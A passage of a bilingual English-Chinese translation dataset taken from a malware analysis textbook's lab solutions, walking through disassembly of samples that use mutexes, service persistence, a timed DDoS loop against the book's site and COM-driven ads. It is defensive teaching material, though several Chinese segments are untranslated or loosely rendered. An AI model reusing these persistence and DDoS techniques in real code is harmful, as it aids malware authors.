- en: The first function call is to OpenMutexA at . The only thing of note is that
    this call is attempting to obtain a handle to the named mutex HGL345 at . If
    the call fails, the program exits.
  id: totrans-1637
  prefs: []
  type: TYPE_NORMAL
  zh: The first function call is to OpenMutexA at . The only thing of note is that
    this call is attempting to obtain a handle to the named mutex HGL345 at . If
    the call fails, the program exits.
- en: '**514**'
  id: totrans-1638
  prefs: []
  type: TYPE_NORMAL
  zh: '**514**'
- en: Appendix C
  id: totrans-1639
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1640
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: The next call is shown in the following listing.
  id: totrans-1641
  prefs: []
  type: TYPE_NORMAL
  zh: The next call is shown in the following listing.
- en: 00401064 push esi
  id: totrans-1642
  prefs: []
  type: TYPE_NORMAL
  zh: 00401064 push esi
- en: 00401065 push offset Name ; "HGL345"
  id: totrans-1643
  prefs: []
  type: TYPE_NORMAL
  zh: 00401065 push offset Name ; "HGL345"
- en: 0040106A push 0 ; bInitialOwner
  id: totrans-1644
  prefs: []
  type: TYPE_NORMAL
  zh: 0040106A push 0 ; bInitialOwner
- en: 0040106C push 0 ; lpMutexAttributes
  id: totrans-1645
  prefs: []
  type: TYPE_NORMAL
  zh: 0040106C push 0 ; lpMutexAttributes
- en: 0040106E call ds:CreateMutexA
  id: totrans-1646
  prefs: []
  type: TYPE_NORMAL
  zh: 0040106E call ds:CreateMutexA
- en: This code creates a mutex at  named HGL345 . The combination of these two
    mutex calls is designed to ensure that only one copy of this executable is running
    on a system at any given time. If a copy was already running, then the first call
    to OpenMutexA would have been successful, and the program would have exited.
  id: totrans-1647
  prefs: []
  type: TYPE_NORMAL
  zh: This code creates a mutex at  named HGL345 . The combination of these two
    mutex calls is designed to ensure that only one copy of this executable is running
    on a system at any given time. If a copy was already running, then the first call
    to OpenMutexA would have been successful, and the program would have exited.
- en: '**7**'
  id: totrans-1648
  prefs: []
  type: TYPE_NORMAL
  zh: '**7**'
- en: Next, the code calls OpenSCManager, which opens a handle to the service control
    manager so that the program can add or modify services. The next call is to the
    GetModuleFileName function, which returns the full pathname to the currently running
    executable or a loaded DLL. The first parameter is a handle to the module for
    which the name should be retrieved, or it is NULL
  id: totrans-1649
  prefs: []
  type: TYPE_NORMAL
  zh: Next, the code calls OpenSCManager, which opens a handle to the service control
    manager so that the program can add or modify services. The next call is to the
    GetModuleFileName function, which returns the full pathname to the currently running
    executable or a loaded DLL. The first parameter is a handle to the module for
    which the name should be retrieved, or it is NULL
- en: to get the full pathname of the executable.
  id: totrans-1650
  prefs: []
  type: TYPE_NORMAL
  zh: to get the full pathname of the executable.
- en: The full pathname is used by CreateServiceA to create a new service. The CreateServiceA
    call has many parameters, but the key ones are noted in the following listing.
  id: totrans-1651
  prefs: []
  type: TYPE_NORMAL
  zh: The full pathname is used by CreateServiceA to create a new service. The CreateServiceA
    call has many parameters, but the key ones are noted in the following listing.
- en: 0040109A push 0 ; lpPassword
  id: totrans-1652
  prefs: []
  type: TYPE_NORMAL
  zh: 0040109A push 0 ; lpPassword
- en: 0040109C push 0 ; lpServiceStartName
  id: totrans-1653
  prefs: []
  type: TYPE_NORMAL
  zh: 0040109C push 0 ; lpServiceStartName
- en: 0040109E push 0 ; lpDependencies
  id: totrans-1654
  prefs: []
  type: TYPE_NORMAL
  zh: 0040109E push 0 ; lpDependencies
- en: 004010A0 push 0 ; lpdwTagId
  id: totrans-1655
  prefs: []
  type: TYPE_NORMAL
  zh: 004010A0 push 0 ; lpdwTagId
- en: 004010A2 lea ecx, [esp+414h+BinaryPathName]
  id: totrans-1656
  prefs: []
  type: TYPE_NORMAL
  zh: 004010A2 lea ecx, [esp+414h+BinaryPathName]
- en: 004010A6 push 0 ; lpLoadOrderGroup
  id: totrans-1657
  prefs: []
  type: TYPE_NORMAL
  zh: 004010A6 push 0 ; lpLoadOrderGroup
- en: 004010A8 push ecx ; lpBinaryPathName
  id: totrans-1658
  prefs: []
  type: TYPE_NORMAL
  zh: 004010A8 push ecx ; lpBinaryPathName
- en: 004010A9 push 0 ; dwErrorControl
  id: totrans-1659
  prefs: []
  type: TYPE_NORMAL
  zh: 004010A9 push 0 ; dwErrorControl
- en: 004010AB push 2 ; dwStartType
  id: totrans-1660
  prefs: []
  type: TYPE_NORMAL
  zh: 004010AB push 2 ; dwStartType
- en: 004010AD push 10h ; dwServiceType
  id: totrans-1661
  prefs: []
  type: TYPE_NORMAL
  zh: 004010AD push 10h ; dwServiceType
- en: 004010AF push 2 ; dwDesiredAccess
  id: totrans-1662
  prefs: []
  type: TYPE_NORMAL
  zh: 004010AF push 2 ; dwDesiredAccess
- en: 004010B1 push offset DisplayName ; "Malservice"
  id: totrans-1663
  prefs: []
  type: TYPE_NORMAL
  zh: 004010B1 push offset DisplayName ; "Malservice"
- en: 004010B6 push offset DisplayName ; "Malservice"
  id: totrans-1664
  prefs: []
  type: TYPE_NORMAL
  zh: 004010B6 push offset DisplayName ; "Malservice"
- en: 004010BB push esi ; hSCManager
  id: totrans-1665
  prefs: []
  type: TYPE_NORMAL
  zh: 004010BB push esi ; hSCManager
- en: 004010BC call ds:CreateServiceA
  id: totrans-1666
  prefs: []
  type: TYPE_NORMAL
  zh: 004010BC call ds:CreateServiceA
- en: The key CreateServiceA parameters are BinaryPathName at , dwStartType at ,
    and dwServiceType at . The binary path to the executable is the same as the path
    to the currently running executable retrieved by the GetModuleFileName call. The
    GetModuleFileName call is needed because the malware may not know its directory
    or filename. By dynamically obtaining this information, it can install the service
    no matter which executable is called or where it is stored.
  id: totrans-1667
  prefs: []
  type: TYPE_NORMAL
  zh: The key CreateServiceA parameters are BinaryPathName at , dwStartType at ,
    and dwServiceType at . The binary path to the executable is the same as the path
    to the currently running executable retrieved by the GetModuleFileName call. The
    GetModuleFileName call is needed because the malware may not know its directory
    or filename. By dynamically obtaining this information, it can install the service
    no matter which executable is called or where it is stored.
- en: The MSDN documentation lists valid entries for the dwServiceType and dwStartType
    parameters. For dwStartType, the possibilities are SERVICE_BOOT_START
  id: totrans-1668
  prefs: []
  type: TYPE_NORMAL
  zh: The MSDN documentation lists valid entries for the dwServiceType and dwStartType
    parameters. For dwStartType, the possibilities are SERVICE_BOOT_START
- en: (0x00), SERVICE_SYSTEM_START (0x01), SERVICE_AUTO_START (0x02), SERVICE_DEMAND_START
  id: totrans-1669
  prefs: []
  type: TYPE_NORMAL
  zh: (0x00), SERVICE_SYSTEM_START (0x01), SERVICE_AUTO_START (0x02), SERVICE_DEMAND_START
- en: Solutions to Labs
  id: totrans-1670
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**515**'
  id: totrans-1671
  prefs: []
  type: TYPE_NORMAL
  zh: '**515**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1672
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: (0x03), and SERVICE_DISABLED (0x04). The malware passed 0x02, which corresponds
    to SERVICE_AUTO_START, indicating that the service runs automatically on system
    startup.
  id: totrans-1673
  prefs: []
  type: TYPE_NORMAL
  zh: (0x03)，和 SERVICE_DISABLED (0x04)。恶意软件传递了 0x02，对应于 SERVICE_AUTO_START，表示该服务在系统启动时自动运行。
- en: A lot of code manipulates time-related structures. IDA Pro has labeled a structure
    to be a SYSTEMTIME structure, which is one of several Windows time structures.
    According to MSDN, the SYSTEMTIME structure has separate fields for the second,
    minute, hour, day, and so on, for use in specifying time. In this case, all values
    are first set to 0, and then the value for the year is set to 0x0834 at , or
    2100 in decimal. This time represents midnight on January 1, 2100\. The program
    then calls SystemTimeToFileTime between time formats.
  id: totrans-1674
  prefs: []
  type: TYPE_NORMAL
  zh: 许多代码操作与时间相关的结构。IDA Pro 将一个结构标记为 SYSTEMTIME 结构，这是几个 Windows 时间结构之一。根据 MSDN，SYSTEMTIME
    结构有单独的字段用于秒、分、时、日等，用于指定时间。在这种情况下，所有值首先设置为 0，然后在  处将年份设置为 0x0834，或十进制的 2100。这个时间代表
    2100 年 1 月 1 日的午夜。然后程序在时间格式之间调用 SystemTimeToFileTime。
- en: 004010C2 xor edx, edx
  id: totrans-1675
  prefs: []
  type: TYPE_NORMAL
  zh: 004010C2 xor edx, edx
- en: 004010C4 lea eax, [esp+404h+DueTime]
  id: totrans-1676
  prefs: []
  type: TYPE_NORMAL
  zh: 004010C4 lea eax, [esp+404h+DueTime]
- en: 004010C8 mov dword ptr [esp+404h+SystemTime.wYear], edx 004010CC lea ecx, [esp+404h+SystemTime]
  id: totrans-1677
  prefs: []
  type: TYPE_NORMAL
  zh: 004010C8 mov dword ptr [esp+404h+SystemTime.wYear], edx 004010CC lea ecx, [esp+404h+SystemTime]
- en: 004010D0 mov dword ptr [esp+404h+SystemTime.wDayOfWeek], edx 004010D4 push eax
    ; lpFileTime
  id: totrans-1678
  prefs: []
  type: TYPE_NORMAL
  zh: 004010D0 mov dword ptr [esp+404h+SystemTime.wDayOfWeek], edx 004010D4 push eax
    ; lpFileTime
- en: 004010D5 mov dword ptr [esp+408h+SystemTime.wHour], edx 004010D9 push ecx ;
    lpSystemTime
  id: totrans-1679
  prefs: []
  type: TYPE_NORMAL
  zh: 004010D5 mov dword ptr [esp+408h+SystemTime.wHour], edx 004010D9 push ecx ;
    lpSystemTime
- en: 004010DA mov dword ptr [esp+40Ch+SystemTime.wSecond], edx 004010DE mov
  id: totrans-1680
  prefs: []
  type: TYPE_NORMAL
  zh: 004010DA mov dword ptr [esp+40Ch+SystemTime.wSecond], edx 004010DE mov
- en: [esp+40Ch+SystemTime.wYear], 834h
  id: totrans-1681
  prefs: []
  type: TYPE_NORMAL
  zh: [esp+40Ch+SystemTime.wYear], 834h
- en: 004010E5 call ds:SystemTimeToFileTime
  id: totrans-1682
  prefs: []
  type: TYPE_NORMAL
  zh: 004010E5 call ds:SystemTimeToFileTime
- en: Next, the program calls CreateWaitableTimer, SetWaitableTimer, and WaitForSingleObject.
    The most important argument for our purposes is the lpDueTime argument to SetWaitableTimer.
    The argument is the FileTime returned by SystemTimeToFileTime, as shown in the
    preceding listing. The code then uses WaitForSingleObject to wait until January
    1, 2100\.
  id: totrans-1683
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，程序调用 CreateWaitableTimer、SetWaitableTimer 和 WaitForSingleObject。对我们来说最重要的参数是
    SetWaitableTimer 的 lpDueTime 参数。该参数是 SystemTimeToFileTime 返回的 FileTime，如前面的列表所示。然后代码使用
    WaitForSingleObject 等待直到 2100 年 1 月 1 日。
- en: The code then loops 20 times, as shown in the following listing.
  id: totrans-1684
  prefs: []
  type: TYPE_NORMAL
  zh: 代码随后循环 20 次，如下面的列表所示。
- en: 00401121 mov
  id: totrans-1685
  prefs: []
  type: TYPE_NORMAL
  zh: 00401121 mov
- en: esi, 14h
  id: totrans-1686
  prefs: []
  type: TYPE_NORMAL
  zh: esi, 14h
- en: 00401126 push 0 ; lpThreadId
  id: totrans-1687
  prefs: []
  type: TYPE_NORMAL
  zh: 00401126 push 0 ; lpThreadId
- en: 00401128 push 0 ; dwCreationFlags
  id: totrans-1688
  prefs: []
  type: TYPE_NORMAL
  zh: 00401128 push 0 ; dwCreationFlags
- en: 0040112A push 0 ; lpParameter
  id: totrans-1689
  prefs: []
  type: TYPE_NORMAL
  zh: 0040112A push 0 ; lpParameter
- en: 0040112C push offset StartAddress ; lpStartAddress
  id: totrans-1690
  prefs: []
  type: TYPE_NORMAL
  zh: 0040112C push offset StartAddress ; lpStartAddress
- en: 00401131 push 0 ; dwStackSize
  id: totrans-1691
  prefs: []
  type: TYPE_NORMAL
  zh: 00401131 push 0 ; dwStackSize
- en: 00401133 push 0 ; lpThreadAttributes
  id: totrans-1692
  prefs: []
  type: TYPE_NORMAL
  zh: 00401133 push 0 ; lpThreadAttributes
- en: 00401135 call edi ; CreateThread
  id: totrans-1693
  prefs: []
  type: TYPE_NORMAL
  zh: 00401135 call edi ; CreateThread
- en: 00401137 dec
  id: totrans-1694
  prefs: []
  type: TYPE_NORMAL
  zh: 00401137 dec
- en: esi
  id: totrans-1695
  prefs: []
  type: TYPE_NORMAL
  zh: esi
- en: 00401138 jnz
  id: totrans-1696
  prefs: []
  type: TYPE_NORMAL
  zh: 00401138 jnz
- en: short loc_401126
  id: totrans-1697
  prefs: []
  type: TYPE_NORMAL
  zh: short loc_401126
- en: Here, ESI is set at  as the counter to 0x14 (20 in decimal). At the end of
    the loop, ESI is decremented at , and when it hits zero at , the loop exits.
    A call to CreateThread at  has several parameters, but only one is important
    to us. The lpStartAddress parameter at  tells us which function will be used
    as the start address for the thread—labeled StartAddress in this case.
  id: totrans-1698
  prefs: []
  type: TYPE_NORMAL
  zh: 在这里，ESI 被设置为  作为对 0x14（十进制的 20）的计数器。在循环结束时，ESI 在  处递减，当它达到零在  时，循环退出。在 
    处对 CreateThread 的调用有几个参数，但只有一个对我们很重要。lpStartAddress 参数在  处告诉我们哪个函数将被用作线程的起始地址——在本例中标记为
    StartAddress。
- en: We double-click StartAddress. We see that this function calls InternetOpen to
    initialize a connection to the Internet, and then calls InternetOpenUrlA from
    within a loop, which is shown in the following code.
  id: totrans-1699
  prefs: []
  type: TYPE_NORMAL
  zh: 我们双击 StartAddress。我们看到这个函数调用 InternetOpen 来初始化对互联网的连接，然后在一个循环中调用 InternetOpenUrlA，如下面的代码所示。
- en: '**516**'
  id: totrans-1700
  prefs: []
  type: TYPE_NORMAL
  zh: '**516**'
- en: Appendix C
  id: totrans-1701
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1702
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 0040116D push 0 ; dwContext 0040116F push 80000000h ; dwFlags
  id: totrans-1703
  prefs: []
  type: TYPE_NORMAL
  zh: 0040116D push 0 ; dwContext 0040116F push 80000000h ; dwFlags
- en: 00401174 push 0 ; dwHeadersLength
  id: totrans-1704
  prefs: []
  type: TYPE_NORMAL
  zh: 00401174 push 0 ; dwHeadersLength
- en: 00401176 push 0 ; lpszHeaders
  id: totrans-1705
  prefs: []
  type: TYPE_NORMAL
  zh: 00401176 push 0 ; lpszHeaders
- en: 00401178 push offset szUrl ; "http://www.malwareanalysisbook.com"
  id: totrans-1706
  prefs: []
  type: TYPE_NORMAL
  zh: 00401178 push offset szUrl ; "http://www.malwareanalysisbook.com"
- en: 0040117D push esi ; hInternet
  id: totrans-1707
  prefs: []
  type: TYPE_NORMAL
  zh: 0040117D push esi ; hInternet
- en: 0040117E call edi ; InternetOpenUrlA
  id: totrans-1708
  prefs: []
  type: TYPE_NORMAL
  zh: 0040117E call edi ; InternetOpenUrlA
- en: 00401180 jmp short loc_40116D
  id: totrans-1709
  prefs: []
  type: TYPE_NORMAL
  zh: 00401180 jmp short loc_40116D
- en: The jmp instruction at the end of the loop at  is an unconditional jump, which
    means that the code will never end; it will call InternetOpenUrlA  and download
    the home page of *www.malwareanalysisbook.com*  forever. And because CreateThread
    is called 20 times, 20 threads will call InternetOpenUrlA **7**
  id: totrans-1710
  prefs: []
  type: TYPE_NORMAL
  zh: 在循环末尾的jmp指令是一个无条件跳转，这意味着代码永远不会结束；它将无限期地调用InternetOpenUrlA **7** 并下载*www.malwareanalysisbook.com*的主页。
- en: forever. Clearly, this malware is designed to launch a DDoS attack by installing
    itself on many machines. If all of the infected machines connect to the server
    at the same time (January 1, 2100), they may overload the server and make it impossible
    to access the site.
  id: totrans-1711
  prefs: []
  type: TYPE_NORMAL
  zh: 永远。显然，这种恶意软件是为了在许多机器上安装自己而设计，以发起DDoS攻击。如果所有受感染的机器同时在同一时间（公元2100年1月1日）连接到服务器，它们可能会使服务器过载，导致无法访问网站。
- en: In summary, this malware uses mutexes to ensure that only one copy is running
    at a time, creates a service to ensure that it runs again when the system reboots,
    waits until January 1, 2100, and then continues to download *www.malwareanalysisbook.com*
    indefinitely.
  id: totrans-1712
  prefs: []
  type: TYPE_NORMAL
  zh: 总结来说，这种恶意软件使用互斥锁来确保一次只运行一个副本，创建一个服务以确保在系统重启时再次运行，等待到公元2100年1月1日，然后无限期地继续下载*www.malwareanalysisbook.com*。
- en: Note that this malware doesn’t perform all of the functions required of a service.
    Normally, a service must implement functions to be stopped or paused, and it must
    change its status to let the user and OS know that the service has started. Because
    this malware does none of this, its service’s status will always display START_PENDING,
    and the service cannot be stopped while it is running. Malware often implements
    just enough functionality to achieve the author’s goals, without bothering to
    implement the entire functionality required by the specification.
  id: totrans-1713
  prefs: []
  type: TYPE_NORMAL
  zh: 注意，这种恶意软件并没有执行服务所需的所有功能。通常，一个服务必须实现停止或暂停的函数，并且它必须更改其状态，以便让用户和操作系统知道服务已启动。因为这种恶意软件没有做这些，所以它的服务状态将始终显示为START_PENDING，并且在运行时无法停止服务。恶意软件通常只实现足够的功能来实现作者的意图，而不必麻烦实现规范要求的全部功能。
- en: '**NOTE**'
  id: totrans-1714
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*If you ran this lab without a virtual machine, remove the malware by entering*
    *sc delete Malservice at the command line, and then deleting the file itself.*'
  id: totrans-1715
  prefs: []
  type: TYPE_NORMAL
  zh: '*如果您在没有虚拟机的情况下运行了这个实验，请在命令行中输入* *sc delete Malservice* *来删除恶意软件，然后删除该文件本身。*'
- en: '**Lab 7-2 Solutions**'
  id: totrans-1716
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验7-2解决方案**'
- en: '***Short Answers***'
  id: totrans-1717
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短回答***'
- en: 1\.
  id: totrans-1718
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: This program does not achieve persistence. It runs once and then exits.
  id: totrans-1719
  prefs: []
  type: TYPE_NORMAL
  zh: 此程序无法实现持久性。它运行一次后就会退出。
- en: 2\.
  id: totrans-1720
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: The program displays an advertisement web page to the user.
  id: totrans-1721
  prefs: []
  type: TYPE_NORMAL
  zh: 程序向用户显示一个广告网页。
- en: 3\.
  id: totrans-1722
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: The program finishes executing after displaying the advertisement.
  id: totrans-1723
  prefs: []
  type: TYPE_NORMAL
  zh: 程序在显示广告后完成执行。
- en: '***Detailed Analysis***'
  id: totrans-1724
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: 'We begin with some basic static analysis. While we don’t see any interesting
    ASCII strings, we do see one interesting Unicode string: http://www.malwareanalysisbook.com/ad.html.
    We check the imports and Solutions to Labs'
  id: totrans-1725
  prefs: []
  type: TYPE_NORMAL
  zh: 我们从一些基本的静态分析开始。虽然我们没有看到任何有趣的ASCII字符串，但我们确实看到一个有趣的Unicode字符串：http://www.malwareanalysisbook.com/ad.html。我们检查了导入和实验室解决方案
- en: '**517**'
  id: totrans-1726
  prefs: []
  type: TYPE_NORMAL
  zh: '**517**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1727
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'exports of the program, and see only a few imports in addition to the standard
    imports, as follows:'
  id: totrans-1728
  prefs: []
  type: TYPE_NORMAL
  zh: 程序的导出，除了标准导入外，只看到几个导入，如下所示：
- en: SysFreeString
  id: totrans-1729
  prefs: []
  type: TYPE_NORMAL
  zh: SysFreeString
- en: SysAllocString
  id: totrans-1730
  prefs: []
  type: TYPE_NORMAL
  zh: SysAllocString
- en: VariantInit
  id: totrans-1731
  prefs: []
  type: TYPE_NORMAL
  zh: VariantInit
- en: CoCreateInstance
  id: totrans-1732
  prefs: []
  type: TYPE_NORMAL
  zh: CoCreateInstance
- en: OleInitialize
  id: totrans-1733
  prefs: []
  type: TYPE_NORMAL
  zh: OleInitialize
- en: OleUninitialize
  id: totrans-1734
  prefs: []
  type: TYPE_NORMAL
  zh: OleUninitialize
- en: All of these functions are COM-related. The CoCreateInstance and OleInitialize
    functions in particular are required in order to use COM
  id: totrans-1735
  prefs: []
  type: TYPE_NORMAL
  zh: 所有这些函数都与COM相关。特别是，CoCreateInstance和OleInitialize函数是使用COM所必需的
- en: functionality.
  id: totrans-1736
  prefs: []
  type: TYPE_NORMAL
  zh: 功能。
- en: Next, we try dynamic analysis. When we run this program, it opens Internet Explorer
    and displays an advertisement. There’s no evidence of the program modifying the
    system or installing itself to execute when the computer is restarted.
  id: totrans-1737
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们尝试动态分析。当我们运行此程序时，它会打开Internet Explorer并显示一个广告。没有证据表明程序修改了系统或将自己安装为在计算机重启时执行。
- en: Now we can analyze the code in IDA Pro. We navigate to the _main method and
    see the code shown in the following listing.
  id: totrans-1738
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们可以使用IDA Pro分析代码。我们导航到_main方法，看到以下列表中的代码。
- en: 00401003 push 0 ; pvReserved
  id: totrans-1739
  prefs: []
  type: TYPE_NORMAL
  zh: 00401003 push 0 ; pvReserved
- en: 00401005 call ds:OleInitialize
  id: totrans-1740
  prefs: []
  type: TYPE_NORMAL
  zh: 00401005 call ds:OleInitialize
- en: 0040100B test eax, eax
  id: totrans-1741
  prefs: []
  type: TYPE_NORMAL
  zh: 0040100B test eax, eax
- en: 0040100D jl short loc_401085
  id: totrans-1742
  prefs: []
  type: TYPE_NORMAL
  zh: 0040100D jl short loc_401085
- en: 0040100F lea eax, [esp+24h+(1) ppv]
  id: totrans-1743
  prefs: []
  type: TYPE_NORMAL
  zh: 0040100F lea eax, [esp+24h+(1) ppv]
- en: 00401013 push eax ; ppv
  id: totrans-1744
  prefs: []
  type: TYPE_NORMAL
  zh: 00401013 push eax ; ppv
- en: 00401014 push offset riid ; riid
  id: totrans-1745
  prefs: []
  type: TYPE_NORMAL
  zh: 00401014 将 riid 的偏移量压入堆栈；riid
- en: 00401019 push 4 ; dwClsContext
  id: totrans-1746
  prefs: []
  type: TYPE_NORMAL
  zh: 00401019 将 4 压入堆栈；dwClsContext
- en: 0040101B push 0 ; pUnkOuter
  id: totrans-1747
  prefs: []
  type: TYPE_NORMAL
  zh: 0040101B 将 0 压入堆栈；pUnkOuter
- en: 0040101D push offset rclsid ; rclsid
  id: totrans-1748
  prefs: []
  type: TYPE_NORMAL
  zh: 0040101D 将 rclsid 的偏移量压入堆栈；rclsid
- en: 00401022 call ds:CoCreateInstance
  id: totrans-1749
  prefs: []
  type: TYPE_NORMAL
  zh: 00401022 调用 ds:CoCreateInstance
- en: 00401028 mov eax, [esp+24h+ppv]
  id: totrans-1750
  prefs: []
  type: TYPE_NORMAL
  zh: 00401028 将 eax 寄存器加载为 [esp+24h+ppv] 的值
- en: The first thing the malware does is initialize COM and obtain a pointer to a
    COM object with OleInitialize at  and CoCreateInstance at . The COM
  id: totrans-1751
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件首先执行的操作是初始化 COM 并使用 OleInitialize 在  和 CoCreateInstance 在  获取 COM 对象的指针。COM
- en: object returned will be stored on the stack in a variable that IDA Pro has labeled
    ppv, as shown at . In order to determine what COM functionality is being used,
    we need to examine the interface identifier (IID) and class identifier (CLSID).
  id: totrans-1752
  prefs: []
  type: TYPE_NORMAL
  zh: 返回的对象将存储在堆栈上的一个变量中，IDA Pro 标记为 ppv，如下所示在 。为了确定正在使用的 COM 功能，我们需要检查接口标识符（IID）和类标识符（CLSID）。
- en: Clicking rclsid and riid shows that they are 0002DF01-0000-0000-C000-000000000046
    and D30C1661-CDAF-11D0-8A3E-00C04FC9E26E, respectively. To determine which program
    will be called, check the registry for the CLSID, or search for the IID on the
    Internet for any documentation. In this case, these values are the same identifiers
    we used in “The Component Object Model”
  id: totrans-1753
  prefs: []
  type: TYPE_NORMAL
  zh: 点击 rclsid 和 riid 显示它们分别是 0002DF01-0000-0000-C000-000000000046 和 D30C1661-CDAF-11D0-8A3E-00C04FC9E26E。为了确定将被调用的程序，检查注册表中的
    CLSID，或在网上搜索 IID 以获取任何文档。在这种情况下，这些值是我们用于“组件对象模型”中使用的相同标识符。
- en: on page 154\. The IID is for IWebBrowser2, and the CLSID is for Internet Explorer.
  id: totrans-1754
  prefs: []
  type: TYPE_NORMAL
  zh: 在页面 154\. IID 是 IWebBrowser2，CLSID 是 Internet Explorer。
- en: As shown in the following listing, the COM object returned by CoCreateInstance
    is accessed a few instructions later at .
  id: totrans-1755
  prefs: []
  type: TYPE_NORMAL
  zh: 如下所示列表中，CoCreateInstance 返回的 COM 对象在几条指令后被访问在 。
- en: '**518**'
  id: totrans-1756
  prefs: []
  type: TYPE_NORMAL
  zh: '**518**'
- en: Appendix C
  id: totrans-1757
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1758
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 0040105C mov eax, [esp+28h+ppv]
  id: totrans-1759
  prefs: []
  type: TYPE_NORMAL
  zh: 0040105C 将 eax 加载为 [esp+28h+ppv]
- en: 00401060 push ecx
  id: totrans-1760
  prefs: []
  type: TYPE_NORMAL
  zh: 00401060 将 ecx 压入堆栈
- en: 00401061 lea ecx, [esp+2Ch+pvarg]
  id: totrans-1761
  prefs: []
  type: TYPE_NORMAL
  zh: 00401061 将 ecx 寄存器加载为 [esp+2Ch+pvarg] 的值
- en: 00401065 mov edx, [eax]
  id: totrans-1762
  prefs: []
  type: TYPE_NORMAL
  zh: 00401065 将 edx 加载为 [eax]
- en: 00401067 push ecx
  id: totrans-1763
  prefs: []
  type: TYPE_NORMAL
  zh: 00401067 将 ecx 压入堆栈
- en: 00401068 lea ecx, [esp+30h+pvarg]
  id: totrans-1764
  prefs: []
  type: TYPE_NORMAL
  zh: 00401068 将 ecx 加载为 [esp+30h+pvarg]
- en: 0040106C push ecx
  id: totrans-1765
  prefs: []
  type: TYPE_NORMAL
  zh: 0040106C 将 ecx 压入堆栈
- en: 0040106D lea ecx, [esp+34h+var_10]
  id: totrans-1766
  prefs: []
  type: TYPE_NORMAL
  zh: 0040106D 将 ecx 加载为 [esp+34h+var_10]
- en: 00401071 push ecx
  id: totrans-1767
  prefs: []
  type: TYPE_NORMAL
  zh: 00401071 将 ecx 压入堆栈
- en: 00401072 push esi
  id: totrans-1768
  prefs: []
  type: TYPE_NORMAL
  zh: 00401072 将 esi 压入堆栈
- en: 00401073 push eax
  id: totrans-1769
  prefs: []
  type: TYPE_NORMAL
  zh: 00401073 将 eax 压入堆栈
- en: 00401074 call dword ptr [edx+2Ch]
  id: totrans-1770
  prefs: []
  type: TYPE_NORMAL
  zh: 00401074 调用 [edx+2Ch] 的双字指针
- en: '**7**'
  id: totrans-1771
  prefs: []
  type: TYPE_NORMAL
  zh: '**7**'
- en: Following this instruction, EAX points to the location of the COM
  id: totrans-1772
  prefs: []
  type: TYPE_NORMAL
  zh: 在此指令之后，EAX 指向 COM
- en: object. At , EAX is dereferenced and EDX points to the beginning of the COM
    object itself. At , the function at an offset of +0x2C from the object is called.
    As discussed in the chapter, the offset 0x2C for the IWebBrowser2 interface is
    the Navigate function, and we can use the Structures window in IDA Pro to create
    a structure and label the offset. When Navigate is called, Internet Explorer navigates
    to the web address *http://www.malwareanalysisbook*
  id: totrans-1773
  prefs: []
  type: TYPE_NORMAL
  zh: 对象。在 ，EAX 被解引用，EDX 指向 COM 对象本身的开始。在 ，从对象偏移 +0x2C 的函数被调用。正如章节中讨论的，IWebBrowser2
    接口的偏移 0x2C 是 Navigate 函数，我们可以使用 IDA Pro 的结构窗口创建一个结构并标记偏移。当 Navigate 被调用时，Internet
    Explorer 将导航到网页地址 *http://www.malwareanalysisbook*
- en: '*.com/ad.html*.'
  id: totrans-1774
  prefs: []
  type: TYPE_NORMAL
  zh: '*.com/ad.html*.'
- en: After the call to Navigate, there are a few cleanup functions and then the program
    ends. The program doesn’t install itself persistently, and it doesn’t modify the
    system. It simply displays a one-time advertisement.
  id: totrans-1775
  prefs: []
  type: TYPE_NORMAL
  zh: 在调用 Navigate 之后，有一些清理函数，然后程序结束。程序不会持久化安装自身，也不会修改系统。它只是显示一次广告。
- en: When you encounter a simple program like this one, you should consider it suspect.
    It may come packaged with additional malware, of which this is just one component.
  id: totrans-1776
  prefs: []
  type: TYPE_NORMAL
  zh: 当你遇到这样一个简单的程序时，你应该考虑它是可疑的。它可能附带额外的恶意软件，其中这只是其中一个组件。
- en: '**Lab 7-3 Solutions**'
  id: totrans-1777
  prefs: []
  type: TYPE_NORMAL
  zh: '**Lab 7-3 Solutions**'
- en: '***Short Answers***'
  id: totrans-1778
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短回答***'
- en: 1\.
  id: totrans-1779
  prefs: []
  type: TYPE_NORMAL
  zh: 1\.
- en: This program achieves persistence by writing a DLL to *C:\Windows\* *System32*
    and modifying every *.exe* file on the system to import that DLL.
  id: totrans-1780
  prefs: []
  type: TYPE_NORMAL
  zh: 此程序通过将 DLL 写入 *C:\Windows\System32* 并修改系统上的每个 *.exe* 文件以导入该 DLL 来实现持久化。
- en: 2\.
  id: totrans-1781
  prefs: []
  type: TYPE_NORMAL
  zh: 2\.
- en: The program is hard-coded to use the filename *kerne**1**32.dll*, which makes
    a good signature. (Note the use of the number *1* instead of the letter *l*.)
    The program uses a hard-coded mutex named SADFHUHF.
  id: totrans-1782
  prefs: []
